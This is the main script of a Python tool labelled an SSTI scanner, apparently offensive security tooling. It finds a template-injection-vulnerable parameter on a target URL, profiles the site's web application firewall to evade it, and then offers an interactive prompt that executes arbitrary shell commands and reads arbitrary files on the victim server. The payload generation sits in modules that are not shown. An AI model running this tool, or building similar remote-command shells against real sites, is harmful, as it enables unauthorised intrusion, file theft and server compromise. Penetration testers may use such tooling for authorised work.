import argparse
import json
from modules.utils import *
from modules.genWAF import *
from modules.detectParams import *
from modules.genPayload import *

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSTI Scanner")
    parser.add_argument("--url", help="URL of the target")
    parser.add_argument("--params", help="Parameters GET or POST of the target")
    parser.add_argument("--method", help="HTTP method (GET or POST)", default="GET")
    parser.add_argument("--cookie", help="Cookie for the request")

    utils = Utils()
    args = parser.parse_args()

    if not args.url:
        print("Error: The --url argument is required.")
        parser.print_help()
        sys.exit(1)

    if args.method not in ['GET', 'POST']:
        print("Error: The --method argument must be GET or POST.")
        parser.print_help()
        sys.exit(1)

    if not args.params:
        print("Error: The --params argument is required.")
        parser.print_help()
        sys.exit(1)

    params = args.params
    urlTarget = args.url
    method = args.method
    cookie = args.cookie
    isJsonBody = False
    if utils.isJson(params):
        isJsonBody = True
        params = json.loads(params)
    else:
        params = utils.parseParams(params)
    vulnParam = detectParams(urlTarget, method, params, cookie, isJsonBody)
    if vulnParam:
        isContinue = input("Do you want to continue? (y/n): ").lower()
        if isContinue.lower() != "y":
            exit()
    requestHandler = RequestHandler(urlTarget, method, vulnParam, params, cookie, isJsonBody)
    genwaf = genWAF(requestHandler)
    waf = genwaf.generateWAF()
    genPayload = GenPayload(requestHandler, waf)
    command = ""
    while command != "exit":
        print("Type '@cmd [command]' to execute command")
        print("Type '@read' [filename] to read file")
        print("Type 'exit' to exit")
        command = input(">> ")
        if command.startswith("@cmd"):
            command = command.replace("@cmd ", "")
            print(genPayload.execPayload(command))
        elif command.startswith("@read"):
            filename = command.replace("@read ", "")
            print(genPayload.readFile(filename))
